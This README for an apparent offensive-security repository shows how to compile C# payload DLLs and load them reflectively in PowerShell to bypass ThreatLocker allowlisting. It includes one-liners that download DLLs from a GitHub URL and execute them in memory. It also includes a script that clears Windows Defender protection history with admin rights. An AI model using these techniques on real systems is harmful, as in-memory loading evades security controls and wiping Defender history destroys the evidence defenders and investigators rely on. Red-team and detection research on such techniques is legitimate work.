# Reflectively load C# DLLs via PowerShell  

Based on https://ruptura-infosec.com/hack-of-the-month/bypassing-threatlocker-with-powershell/  

Add C Sharp Compiler to path
```powershell  
[System.Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\Roslyn\", [System.EnvironmentVariableTarget]::Machine)
```  

Compile DLL from .cs    
```powershell  
csc /target:library /out:payload.dll test.cs
csc /target:library /out:get-sec-history.dll get-sec-history.cs
csc /target:library /out:clear-sec-history.dll clear-sec-history.cs
```  

Load DLL reflectively in PowerShell POC
```powershell  
$currentDir = Get-Location
$bytes = [IO.File]::ReadAllBytes("$currentDir\payload.dll")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$instance = $assembly.CreateInstance("ProgramNamespace.Program")
$instance.RunO()
```  

Load DLL method 1 (Create instance from local file)  
```powershell  
# Get the current directory
$currentDir = Get-Location

# Load the DLL from the current directory
$bytes = [IO.File]::ReadAllBytes("$currentDir\get-sec-history.dll")
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Create an instance of DefenderHistory class and invoke the method
$instance = $assembly.CreateInstance("SecurityTools.DefenderHistory")
$output = $instance.GetProtectionHistory()
Write-Output $output
```  

Load DLL method 2 (Create instance from web request)  
```powershell  
# URL of the DLL on the web server
$url = "https://github.com/timsonner/load-cs-dll-from-powershell/raw/refs/heads/master/get-sec-history.dll"

# Download the DLL as bytes
$bytes = (New-Object Net.WebClient).DownloadData($url)

# Load the assembly directly from the byte array
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Create an instance of the DefenderHistory class
$instance = $assembly.CreateInstance("SecurityTools.DefenderHistory")

# Invoke the GetProtectionHistory method
$output = $instance.GetProtectionHistory()

# Display the output
Write-Output $output
```  

Clear security events (must be run in admin powershell aka `Start-Process powershell -Verb runas`)  
```powershell  
# URL of the DLL on the web server
$url = "https://github.com/timsonner/load-cs-dll-from-powershell/raw/refs/heads/master/clear-sec-history.dll"

# Download the DLL as bytes
$bytes = (New-Object Net.WebClient).DownloadData($url)

# Load the assembly directly from the byte array
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Create an instance of the DefenderHistory class
$instance = $assembly.CreateInstance("SecurityTools.DefenderHistory")

if ($null -eq $instance) {
    Write-Output "Failed to create an instance. Verify the namespace and class name. Are you running from Administrator PowerShell?????"
    return
}

# Invoke the ClearProtectionHistory method
$output = $instance.ClearProtectionHistory()

# Display the output
Write-Output $output 

```  
